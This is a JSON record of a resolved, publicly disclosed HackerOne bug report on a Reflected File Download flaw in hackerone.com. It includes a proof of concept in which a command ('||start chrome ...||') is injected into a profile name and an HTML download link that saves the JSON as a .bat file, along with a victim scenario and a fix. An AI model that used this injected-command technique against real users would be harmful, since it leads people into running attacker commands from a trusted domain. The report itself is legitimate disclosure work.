{
  "id": 54034,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDAzNA==",
  "url": "https://hackerone.com/reports/54034",
  "title": "Reflected Filename Download",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-03-31T15:56:55.707Z",
  "submitted_at": "2015-03-31T15:56:55.707Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dsopas",
    "url": "/dsopas",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-04-25T08:39:01.632Z",
  "bug_reporter_agreed_on_going_public_at": "2016-04-25T08:39:01.548Z",
  "team_member_agreed_on_going_public_at": "2016-04-25T02:14:12.517Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "First of all congratulations on awesome bounty system. Big fan here! \r\nI found out that it's possible run a RFD attack on Hackerone.\r\n\r\nIf we visit:\r\nhttps://hackerone.com/dsopas\r\n\r\nWe see the normal HTML webpage. Nothing new here.\r\nBut if we add ?format=json to the URL we can see the JSON file generated by my profile.\r\n\r\nhttps://hackerone.com/dsopas?format=json\r\n\r\n{\"id\":15486,\"username\":\"dsopas\",\"name\":\"David Sopas\\\"||start chrome websegura.net||\",\"url\":\"https://hackerone.com/dsopas\",\"profile_pictures\":{\"small\":\"\\u003cimg class=\\\"avatar small circle \\\" alt=\\\"dsopas\\\" title=\\\"David Sopas\\u0026quot;||start chrome websegura.net|| (dsopas)\\\" src=\\\"https://profile-photos.hackerone-user-content.com/production/000/015/486/fe059c014e6e7a110a8e9611751b0e68b62bf009_small.jpg?1426253052\\\" /\\u003e\",\"medium\":\"\\u003cimg class=\\\"avatar medium circle \\\" alt=\\\"dsopas\\\" title=\\\"David Sopas\\u0026quot;||start chrome websegura.net|| (dsopas)\\\" src=\\\"https://profile-photos.hackerone-user-content.com/production/000/015/486/faf9fd47449682d2fc487a2b69425032e4c28d03_medium.jpg?1426253052\\\" /\\u003e\"},\"profile_picture_urls\":{\"small\":\"https://profile-photos.hackerone-user-content.com/production/000/015/486/fe059c014e6e7a110a8e9611751b0e68b62bf009_small.jpg?1426253052\",\"medium\":\"https://profile-photos.hackerone-user-content.com/production/000/015/486/faf9fd47449682d2fc487a2b69425032e4c28d03_medium.jpg?1426253052\"},\"disabled\":false,\"bug_count\":1,\"target_count\":1,\"reputation\":92,\"rank\":null}\r\n\r\nWhat is funny about this is that I can inject under my name the reflected part of a RFD vulnerability.\r\nCheck out my online proof-of-concept:\r\n\r\nHTML:\r\n<div align=\"center\">\r\n<a href=\"https://hackerone.com/dsopas?format=json\" download=\"HackerOneBonus.bat\" onclick=\"return false;\">HackerOne.com Bonus App</a>\r\n<p><i>(Use \"Save link as\" to download the file)</i></p>\r\n</div> \r\n\r\nhttp://www.websegura.net/hackerone_rfd.htm\r\n\r\nRunning the batch file in this PoC will only open my portuguese personal website - websegura.net with Google Chrome. But this can be changed with many malicious commands.\r\n\r\nDue to filename restritions on the HackerOne path we need to use HTML5 <A DOWNLOAD> attribute to do this. Due to this situation the following browsers are supported:\r\n\r\n- Chrome\r\n- Opera\r\n- Android Browser\r\n- Chrome for Android\r\n- Firefox [forcing the user to \"Save Link As\"]\r\n\r\nWhat this will do is when the user click on the download link will get a file supposed to be on HackerOne.com [a trusted domain] gaining credibility from the victim.\r\n\r\nSo a possible attack scenario will be:\r\n1. Malicious user shares his manipulated URL\r\n2. Victims clicks on the link and checks that the file is stored on trusted HackerOne servers and runs it\r\n3. Victims computer gets hijacked\r\n\r\nI attached some screens.\r\n\r\nHow to fix this?\r\nA possible solution is to sanitize for special chars like \"||\" in the account fields and use \"content-disposition\" header to force the filename name.\r\n\r\nFeel free to reply if you have any questions or need more information.\r\nIt was a great challenge to find this on HackerOne :)",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 33258,
      "file_name": "hackerone_chrome.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/033/258/ab146211e84f85a7841b6b709f2b428da87e2c59/hackerone_chrome.jpg?response-content-disposition=attachment%3B%20filename%3D%22hackerone_chrome.jpg%22%3B%20filename%2A%3DUTF-8%27%27hackerone_chrome.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T113823Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ce8b42e9f36683a6e4d0d59dbfff188ba5a0d7f7aadfaeb18ad0e106f2717ab",
      "file_size": 18347,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 33259,
      "file_name": "hackerone_opera.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/033/259/c111e29aded95622c1512518fd420eec8b055404/hackerone_opera.jpg?response-content-disposition=attachment%3B%20filename%3D%22hackerone_opera.jpg%22%3B%20filename%2A%3DUTF-8%27%27hackerone_opera.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T113823Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7463ad09347615d253ce02f4dec72e00a41dc4a73132e9bbfbac72dcde2e23fa",
      "file_size": 33796,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2016-05-25T02:14:12.596Z",
  "allow_singular_disclosure_after": -243681850.42879707,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "an40r1",
    "hogarth45",
    "shubham_srt",
    "shivammusic",
    "spetr0x",
    "dyabla",
    "deandre_7",
    "golaroo"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
